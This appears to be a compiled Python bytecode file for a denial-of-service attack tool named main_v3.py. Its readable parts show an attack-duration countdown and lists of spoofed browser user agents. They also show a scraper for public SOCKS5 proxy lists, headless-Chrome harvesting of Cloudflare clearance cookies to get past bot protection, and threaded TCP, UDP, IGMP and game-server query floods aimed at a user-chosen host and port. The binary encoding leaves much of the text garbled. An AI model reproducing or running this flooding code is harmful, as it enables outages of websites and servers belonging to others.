�
    �d}H �                   ��  � d dl mZmZ d dlZd dlmZmZ d dl Z d dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dlZd dlmZ d dlmZmZ d dlmZ d d	lmZ  ed
��  �         d� Zg d�Zg d�Zg d�Zda d� Z!d� Z"d� Z#d� Z$d� Z%d� Z&d� Z'd� Z(d� Z)d� Z*d� Z+d� Z,d� Z-d� Z.d� Z/d � Z0d!� Z1d"� Z2d#� Z3d$� Z4d%� Z5d&� Z6d'� Z7d(� Z8d)� Z9d*� Z:d+� Z;d,� Z<d-� Z=d.� Z>d/� Z?d0� Z@d1� ZAd2� ZBd3� ZCd4� ZDd5� ZEd6� ZFd7� ZGd8� ZHd9� ZId:� ZJd;� ZKd<� ZLd=� ZMd>� ZNd?� ZOd@� ZPdA� ZQdB� ZRdC� ZSdD� ZTdE� ZUdF� ZVdG� ZWdH� ZXdI� ZYdJ� ZZdK� Z[dL� Z\dM� Z]dN� Z^e_dOk    r  eU�   �           e\�   �          	  e]�   �          �dS )P�    )�system�nameN)�AsyncClient�Headers)�urlparse)�RequestsCookieJar)�stdout)�Fore�init)�argv)�ThreadT)�convertc                 �\  � t           j         �                    �   �         t          j        t          | �  �        ��  �        z   }	 |t           j         �                    �   �         z
  �                    �   �         dk    rjt          j        �   �          t          j        dt          |t           j         �                    �   �         z
  �                    �   �         �  �        � d��  �         nIt          j        �   �          t          j        dt          j
        z   dz   t          j        z   dz   �  �         d S ��)	N��secondsTr   ub    
╔══════════[Attack time]══════════╗     
    Time: u�                            
╚═════════════════════════════════╝z z[*]z2 Attack Done !                                   
)�datetime�now�	timedelta�int�total_secondsr	   �flush�write�strr
   �MAGENTA�WHITE)�t�untils     �Name\main_v3.py�	countdownr      s
  � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E�
��H�%�)�)�+�+�+�:�:�<�<�q�@�@��L�N�N�N��L� m����)�-�-�/�/�/�>�>�@�@�A�A�m� m� m� n� n� n� n�
 �L�N�N�N��L��t�|�+�E�1�$�*�<�=r�r�s�s�s��F�
�    )�zZMozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1zWMozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zBMozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z?Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0zUMozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zcMozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2z�Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0zGMozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0zCMozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zOMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zjMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6zLMozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1zJMozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1zRMozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4prezJMozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2zJMozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1zbMozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3z`Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0zFMozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)zPMozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016zwMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10zsMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7z\Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18z\Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10zuMozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)zsMozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9zvMozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8zqMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)zwMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )zrMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1zuMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14z]Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5zbMozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2prezoMozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12zsMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20z>Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0azMMozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2zCMozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0zaMozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34z�Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1z�Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2zNMozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z[Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zVMozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zCMozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 zDMozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zJMozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6prez@Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0zTMozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2z@Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0z@Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5zUMozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2prezHMozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1zYMozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2zFMozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zLMozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1prezPMozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0zFMozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1zoMozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0zRMozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8zmMozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0zNMozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15z8Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) GeckoztMozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16zMMozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025zTMozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1zMMozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020zbMozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1zXMozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)zlMozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncherzrMozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 DebianzkMozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8z�Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15zJMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8zCMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7zEMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5zDMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14ziMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)zYMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6zWMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)ziMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11zWMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)zVMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0zgMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2zCMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330zXMozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)zcMozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8znMozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0z`Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)�mMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9�pMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15�mMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7�xMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0zWMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8zVMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12zhMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5zYMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9zjMozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12zbMozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0zUMozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15zmMozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0zmMozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3zNMozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5zTMozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8zQMozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3zUMozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6r!   r"   r#   r$   z�Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNz�Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CNz�Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNz�Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNa   Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CNz�Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN)�GET�POST�HEAD)z^https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=allz6https://www.proxy-list.download/api/v1/get?type=socks5z-https://www.proxyscan.io/download?type=socks5zHhttps://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txtz
socks5.txtc                  ��   � t          t          d�  �        } t          D ]6}	 | �                    t	          j        |�  �        j        �  �         �0#  Y �4xY w| �                    �   �          d S )N�wb)�open�	socksFile�proxyResourcesr   �requests�get�content�close)�f�urls     r   �socksCrawlerr3   �   sf   � ��Y�t���A�� � ��	��G�G�H�L��%�%�-�.�.�.�.��	��D�����G�G�I�I�I�I�Is   �,A�Ac                 �  � | �                     �   �         } i }t          | �  �        j        |d<   |d         dk    rd|d<   t          | �  �        j        |d<   t          | �  �        j        |d<   dt          | �  �        j        v r1t          | �  �        j        �                    d�  �        d         |d<   n t          | �  �        j        d	k    rd
nd|d<   	 |S )N�uri� �/�host�scheme�:�   �port�https�443�80)�rstripr   �path�netlocr9   �split)r2   �targets     r   �
get_targetrE   �   s�   � �
�*�*�,�,�C��F��S�M�M�&�F�5�M��e�}������u���c�]�]�)�F�6�N���}�}�+�F�8��
�h�s�m�m�"�"�"�!�#���-�3�3�C�8�8��;��v���"*�3�-�-�"6�'�"A�"A���t��v����Mr    c                  �  � t           j        �                    d�  �        s3t          j        t
          j        dz   t
          j        z   dz   �  �         dS t          dd�  �        �	                    �   �         �
                    d�  �        adS )N�
./http.txtz [*]z$ You Need Proxy File ( ./http.txt )
F�r�
T)�osrA   �existsr	   r   r
   r   r   r*   �readrC   �proxies� r    r   �get_proxiesrO   �   so   � ��7�>�>�,�'�'� ���T�\�&�(���3�4[�[�\�\�\��u��<��%�%�*�*�,�,�2�2�4�8�8�G��4r    c                 �z  � t          j        �   �         }g d�}|D ]}|�                    |�  �         �t          j        |��  �        }|�                    d�  �         |�                    | �  �         t          d�  �        D ]�}|�                    �   �         }d}|D ]w}|d         dk    rd|�                    �   �         |         a|�	                    d�  �        a
t          d         � d	t          d
         � �a|�                    �   �            dS |dz  }�xt          j        d�  �         ��|�                    �   �          dS )N)z--no-sandboxz--disable-setuid-sandboxz--disable-infobarsz--disable-loggingz--disable-login-animationsz--disable-notificationsz--disable-gpuz
--headlessz--lang=ko_KRz--start-maxmizedz�--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en)�options�   �<   r   r   �cf_clearancezreturn navigator.userAgent�=�valueTr;   F)�	webdriver�ChromeOptions�add_argument�Chrome�implicitly_waitr.   �range�get_cookies�	cookieJAR�execute_script�	useragent�cookie�quit�time�sleep)	r2   rQ   �	arguments�argument�driver�_�cookies�tryy�is	            r   �
get_cookierl   �   sR  � ��%�'�'�G�� � �I�
 � '� '�����X�&�&�&�&���g�.�.�.�F�
���1����
�J�J�s�O�O�O��2�Y�Y� � ���$�$�&�&����� 		� 		�A���y�N�*�*�"�.�.�0�0��6�	�"�1�1�2N�O�O�	�%�f�-�D�D�	�'�0B�D�D���������t�t�t���	����
�1�����
�K�K�M�M�M��5r    c                  ��  � t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         } t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         }t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         }| ||fS )N�   [38;2;255;20;147m • z	URL      �: �	THREAD   �	TIME(s)  �r	   r   r
   r   �LIGHTRED_EX�input)rD   �threadr   s      r   �get_info_l7rv   �   s�   � �
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l��W�W�F�
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l��W�W�F�
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l����A��6�1��r    c                  �  � t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         } t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         }t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         }t          j        dt          j        z   dz   t          j        z   dz   t          j        z   �  �         t          �   �         }| |||fS )Nrn   z	IP       ro   z	PORT     rp   rq   rr   )rD   r<   ru   r   s       r   �get_info_l4rx   �   s  � �
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l��W�W�F�
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l��7�7�D�
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l��W�W�F�
�L�-�d�j�8��D�T�EU�U�VZ�Z�[_�[k�k�l�l�l����A��4���"�"r    c                 �d  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          j        d�  �        }t          t          |�  �        �  �        D ]=}	 t          j        t          | |||f��  �        }|�
                    �   �          �7#  Y �;xY wd S )Nr   i   �rD   �args)r   r   r   r   �random�_urandomr\   �	threadingr   �flooder�start�r8   r<   �thr   r   �randrh   �thds           r   �
runflooderr�     s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��?�4� � �D��3�r�7�7�^�^� � ��	��"�'��t�T�5�8Q�R�R�R�C��I�I�K�K�K�K��	��D����� s   �53B)�)B-c                 �  � t          j         t           j        t           j        �  �        5 }|�                    d�  �         d d d �  �         n# 1 swxY w Y   |t          j        �                    �   �         z
  �                    �   �         dk    rv	 |dk    rt          j        dd�  �        n|}|�	                    | |f�  �         n#  Y nxY w|t          j        �                    �   �         z
  �                    �   �         dk    �td S d S )Nr   r;   i��  )
�socket�AF_INET�SOCK_STREAM�setblockingr   r   r   r|   �randint�connect)r8   r<   r�   �until_datetime�sock�dports         r   r   r     s-  � �	��v�~�v�'9�	:�	:� �d��������� � � � � � � � � � ���� � � � ��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H��48�A�I�I���q�%�0�0�0�4�����d�E�]�+�+�+�+�������� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �A�A�A�4C �Cc                 �@  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }d}t	          t          |�  �        �  �        D ]=}	 t          j        t          | |||f��  �        }|�                    �   �          �7#  Y �;xY wd S �Nr   �	 /    rz   )	r   r   r   r   r\   r~   r   �miner�   r�   s           r   �runminer�     s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E�.�D��3�r�7�7�^�^� � ��	��"�$�d�D�$��5N�O�O�O�C��I�I�K�K�K�K��	��D����� �   �#3B�Bc                 �  � t          j         t           j        t           j        �  �        }|t          j        �                    �   �         z
  �                    �   �         dk    r{	 |�                    d| t          |�  �        f�  �         n#  |�                    �   �          Y nxY w|t          j        �                    �   �         z
  �                    �   �         dk    �yd S d S �Nr   r�   �	r�   r�   �IPPROTO_IGMPr   r   r   �sendtor   r0   �r8   r<   r�   r�   r�   s        r   r�   r�   $  �   � ��=����)<�=�=�D��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��K�K�;�d�C��I�I�=N�O�O�O�O��	��J�J�L�L�L��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
H�   �"%B �B c                 �@  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }d}t	          t          |�  �        �  �        D ]=}	 t          j        t          | |||f��  �        }|�                    �   �          �7#  Y �;xY wd S r�   )	r   r   r   r   r\   r~   r   �vser�   r�   s           r   �runvser�   -  s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E�.�D��3�r�7�7�^�^� � ��	��"�#�T�4��u�4M�N�N�N�C��I�I�K�K�K�K��	��D����� r�   c                 �  � t          j         t           j        t           j        �  �        }|t          j        �                    �   �         z
  �                    �   �         dk    r{	 |�                    d| t          |�  �        f�  �         n#  |�                    �   �          Y nxY w|t          j        �                    �   �         z
  �                    �   �         dk    �yd S d S r�   r�   r�   s        r   r�   r�   7  r�   r�   c                 �F  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          t          |�  �        �  �        D ]B}	 t          j        t          | ||t          f��  �        }|�	                    �   �          �<#  Y �@xY wd S �Nr   rz   )
r   r   r   r   r\   r~   r   �sender�payloadr�   )r8   r<   r�   r   r   rh   r�   s          r   �	runsenderr�   ?  s�   � � ��!�!�#�#�h�&8��Q���&H�&H�&H�H�E��3�r�7�7�^�^� � ��	��"�&��d�E�7�7S�T�T�T�C��I�I�K�K�K�K��	��D����� s   �!8B�Bc                 �:  � t          j         t           j        t           j        �  �        }|�                    t           j        t           j        d�  �         |t          j        �                    �   �         z
  �                    �   �         dk    r�	 t          j
        d�  �        }|�                    || t          |�  �        f�  �         n#  |�                    �   �          Y nxY w|t          j        �                    �   �         z
  �                    �   �         dk    ��d S d S )Nr;   r   i   )r�   r�   �
SOCK_DGRAM�
setsockopt�
SOL_SOCKET�SO_REUSEADDRr   r   r   r|   r}   r�   r   r0   )r8   r<   r�   r�   r�   s        r   r�   r�   K  s�   � ��=����):�;�;�D��O�O�F�%�v�':�A�>�>�>��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��o�d�+�+�G��K�K��$��D�	�	�!2�3�3�3�3��	��J�J�L�L�L��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
